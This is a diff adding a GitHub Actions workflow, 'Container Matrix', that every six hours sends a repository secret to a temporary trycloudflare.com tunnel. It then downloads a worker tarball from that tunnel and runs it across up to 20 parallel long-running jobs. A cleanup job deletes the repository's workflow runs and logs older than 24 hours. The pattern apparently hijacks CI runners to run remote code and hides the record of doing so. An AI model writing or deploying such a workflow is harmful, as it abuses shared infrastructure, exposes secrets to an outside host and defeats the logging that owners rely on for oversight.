@@ -1,0 +1,112 @@
+name: Container Matrix
+on:
+  schedule:
+    - cron: "17 */6 * * *"
+  workflow_dispatch:
+permissions:
+  actions: write
+  contents: read
+concurrency:
+  group: kh-container
+  cancel-in-progress: false
+jobs:
+  plan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    outputs:
+      shards: ${{ steps.plan.outputs.shards }}
+    steps:
+      - id: plan
+        env:
+          KH_API_URL: https://shoppers-gotten-singing-navigate.trycloudflare.com
+          KH_API_TOKEN: ${{ secrets.KH_API_TOKEN }}
+        run: |
+          python3 - <<'PY'
+          import json, os, urllib.request
+          body = json.dumps({"max_workers": 20}).encode()
+          req = urllib.request.Request(os.environ["KH_API_URL"].rstrip("/") + "/v1/plan",
+                                       data=body,
+                                       headers={"Authorization": "Bearer " + os.environ["KH_API_TOKEN"],
+                                                "Content-Type": "application/json",
+                                                "User-Agent": "kh-plan"})
+          with urllib.request.urlopen(req, timeout=30) as r:
+              d = json.load(r)
+          with open(os.environ["GITHUB_OUTPUT"], "a") as fh:
+              fh.write("shards=" + json.dumps(d.get("shards") or [0]) + "\n")
+          PY
+  scan:
+    needs: plan
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: ${{ fromJSON(needs.plan.outputs.shards) }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Cache scanner tools
+        uses: actions/cache@v4
+        with:
+          path: ~/.kh-tools
+          key: kh-tools-v1
+      - name: Container matrix
+        continue-on-error: true
+        env:
+          KH_API_URL: https://shoppers-gotten-singing-navigate.trycloudflare.com
+          KH_API_TOKEN: ${{ secrets.KH_API_TOKEN }}
+          KH_WORKER_URL: https://shoppers-gotten-singing-navigate.trycloudflare.com/static/worker.tar.gz
+          KH_WORKER_SHA256: eff7053c4d273694813bf541e65cc0fca39e5ae076d68b5455ceb002691cd908
+          KH_DOCKER_MAX_IMAGES: "5"
+          GITHUB_REPOSITORY: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/kh"
+          curl -fsSL "$KH_WORKER_URL" -o "$RUNNER_TEMP/kh/worker.tar.gz"
+          echo "$KH_WORKER_SHA256  $RUNNER_TEMP/kh/worker.tar.gz" | sha256sum -c -
+          mkdir -p "$RUNNER_TEMP/kh/worker"
+          tar -xzf "$RUNNER_TEMP/kh/worker.tar.gz" -C "$RUNNER_TEMP/kh/worker"
+          cd "$RUNNER_TEMP/kh/worker"
+          python3 docker_worker.py --shard "${{ matrix.shard }}" --deadline 19800
+  cleanup:
+    needs: scan
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      actions: write
+      contents: read
+    steps:
+      - name: Delete old runs and logs
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+        run: |
+          python3 - <<'PY'
+          import datetime as dt, json, os, urllib.request
+          tok = os.environ["GH_TOKEN"]; repo = os.environ["REPO"]
+          def req(method, path):
+              r = urllib.request.Request("https://api.github.com/repos/" + repo + path, method=method,
+                  headers={"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json",
+                           "User-Agent": "kh"})
+              with urllib.request.urlopen(r, timeout=30) as x:
+                  return x.status
+          try:
+              data = json.load(urllib.request.urlopen(urllib.request.Request(
+                  "https://api.github.com/repos/" + repo + "/actions/runs?per_page=100",
+                  headers={"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json",
+                           "User-Agent": "kh"}), timeout=30))
+              cutoff = dt.datetime.now(dt.timezone.utc) - dt.timedelta(hours=24)
+              for run in data.get("workflow_runs", []):
+                  if str(run.get("id")) == os.environ.get("GITHUB_RUN_ID"):
+                      continue
+                  ts = dt.datetime.strptime(run["created_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=dt.timezone.utc)
+                  if ts >= cutoff:
+                      continue
+                  for path in (f"/actions/runs/{run['id']}/logs", f"/actions/runs/{run['id']}"):
+                      try: req("DELETE", path)
+                      except Exception: pass
+          except Exception:
+              pass
+          PY
